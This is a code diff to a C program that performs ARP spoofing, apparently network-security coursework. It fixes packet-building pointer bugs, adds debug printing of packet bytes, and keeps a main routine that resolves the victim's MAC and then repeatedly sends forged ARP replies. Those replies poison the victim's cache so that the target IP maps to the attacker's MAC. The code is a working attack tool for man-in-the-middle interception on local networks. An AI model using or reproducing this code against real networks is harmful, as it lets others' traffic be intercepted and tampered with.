@@ -114,16 +114,14 @@ void getIpAddress(char *iface, uint32_t &my_ip) {
 }
 
 // make ARP packet
-void *make_arp(PACKET packet, uint8_t *s_mac, uint8_t *d_mac, int opcode, 
+void *make_arp(PACKET *packet, uint8_t *s_mac, uint8_t *d_mac, int opcode, 
 		uint8_t *sender_mac, uint32_t sender_ip, uint8_t *target_mac, uint32_t target_ip, int *packet_len) {
 	
-	ETHERNET eth = make_eth_hdr(s_mac, d_mac);
-	ARP arp = make_arp_hdr(opcode, sender_mac, sender_ip, target_mac, target_ip);
-	
-	memcpy(&packet, &eth, sizeof(eth));
-	*packet_len += sizeof(eth);
-	memcpy(&packet+*packet_len, &arp, sizeof(arp));
-	*packet_len += sizeof(arp);
+	packet->eth = make_eth_hdr(s_mac, d_mac);
+	packet->arp = make_arp_hdr(opcode, sender_mac, sender_ip, target_mac, target_ip);
+
+	*packet_len += sizeof(ETHERNET);
+	*packet_len += sizeof(ARP);
 }
 
 
@@ -199,8 +197,13 @@ int main(int argc, char *argv[]) {
 	PACKET request_packet;
 	memset(&request_packet, 0, sizeof(request_packet));
 
-	make_arp(request_packet, my_mac, broadcast_mac, REQUEST, my_mac, my_ip, unknown_mac, sender_ip, &packet_len);
+	make_arp(&request_packet, my_mac, broadcast_mac, REQUEST, my_mac, my_ip, unknown_mac, sender_ip, &packet_len);
 
+	uint8_t p[42];
+	memcpy(p, &request_packet, sizeof(request_packet));
+	for (int i=0; i<sizeof(request_packet); i++)
+		printf("%02x ", p[i]);
+	
 	int count = 0;
 	while (true) {
 		// send requset packet until get sender's arp reply packet
@@ -227,11 +230,11 @@ int main(int argc, char *argv[]) {
 
 
 	// make attack packet (unicast)
-	packet_len = 0
+	packet_len = 0;
 	PACKET attack_packet;
 	memset(&attack_packet, 0, sizeof(attack_packet));
 
-	make_arp(attack_packet, my_mac, sender_mac, REPLY, my_mac, target_ip, sender_mac, sender_ip, &packet_len);
+	make_arp(&attack_packet, my_mac, sender_mac, REPLY, my_mac, target_ip, sender_mac, sender_ip, &packet_len);
 
 	printf("\n[*] Sending attack packet to sender(victim)!\n");
 	while (true) {
